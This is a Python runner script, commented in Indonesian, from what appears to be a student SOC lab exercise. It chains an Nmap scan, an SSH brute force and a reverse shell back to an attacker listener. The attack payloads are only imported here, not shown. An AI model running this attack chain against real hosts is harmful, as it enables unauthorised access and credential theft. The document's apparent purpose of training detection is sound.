#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  run_all.py — Master Runner semua skenario
=============================================================
  Urutan eksekusi:
    1. scenario_1_recon.py       (Nmap port scan)
    2. scenario_2_bruteforce.py  (SSH brute force)
    3. scenario_3_reverseshell.py (Reverse shell)
=============================================================
"""

import time
import datetime
import sys

# Import semua scenario sebagai modul
from scenario_1_recon      import run_recon,       save_results, TARGET_IP as T1
from scenario_2_bruteforce import run_bruteforce,                TARGET_IP as T2, TARGET_PORT
from scenario_3_reverseshell import trigger_reverseshell, start_listener, \
                                      TARGET_IP as T3, ATTACKER_IP, LISTEN_PORT, \
                                      SSH_USER, SSH_PASS, REVSHELL_CMD

import threading

DELAY_BETWEEN_SCENARIOS = 5   # detik jeda antar skenario

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║           MINI SOC PROJECT — FULL ATTACK SIMULATION          ║
║                      Person A — Red Team                     ║
║  Target  : {target:<50} ║
║  Time    : {time:<50} ║
╚══════════════════════════════════════════════════════════════╝
"""

SEPARATOR = "\n" + "═" * 62 + "\n"


def countdown(seconds: int, label: str):
    """Countdown timer antar skenario."""
    for i in range(seconds, 0, -1):
        print(f"\r[*] {label} dalam {i} detik...  ", end="", flush=True)
        time.sleep(1)
    print(f"\r[*] {label}!{' '*30}")


def print_step(step: int, title: str):
    print(SEPARATOR)
    print(f"  STEP {step}/3 — {title}")
    print(SEPARATOR)


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(target=T1, time=now))

    overall_start = time.time()

    # ── STEP 1: Reconnaissance ────────────────────────────
    print_step(1, "RECONNAISSANCE — Nmap Port Scan")
    recon_results = run_recon(T1)
    save_results(recon_results)

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke Brute Force")

    # ── STEP 2: SSH Brute Force ───────────────────────────
    print_step(2, "CREDENTIAL ATTACK — SSH Brute Force")
    creds = run_bruteforce(T2, TARGET_PORT)

    if not creds:
        print("[!] Brute force tidak menemukan credential.")
        print("[!] Scenario 3 tidak bisa dijalankan tanpa credential.")
        print("[!] Pastikan wordlist mengandung password target.")
        sys.exit(1)

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke Reverse Shell")

    # ── STEP 3: Reverse Shell ─────────────────────────────
    print_step(3, "PERSISTENCE — Reverse Shell")

    print(f"[*] Menggunakan credential: {creds['username']}:{creds['password']}")
    print(f"[*] Membuka listener di {ATTACKER_IP}:{LISTEN_PORT}...")
    print(f"[*] Reverse shell akan aktif setelah target konek balik.\n")

    trigger_thread = threading.Thread(
        target = trigger_reverseshell,
        args   = (T3, TARGET_PORT, creds["username"], creds["password"], REVSHELL_CMD),
        daemon = True,
    )
    trigger_thread.start()

    # Listener blocking — interactive shell sampai user exit
    start_listener(ATTACKER_IP, LISTEN_PORT)

    # ── Summary ───────────────────────────────────────────
    elapsed = time.time() - overall_start
    print(SEPARATOR)
    print(f"  ✅  SIMULASI SELESAI")
    print(f"  Total waktu  : {elapsed:.1f} detik")
    print(f"  Target       : {T1}")
    print(f"  Credential   : {creds['username']}:{creds['password']}")
    print(f"  Skenario     : Recon → Brute Force → Reverse Shell")
    print(SEPARATOR)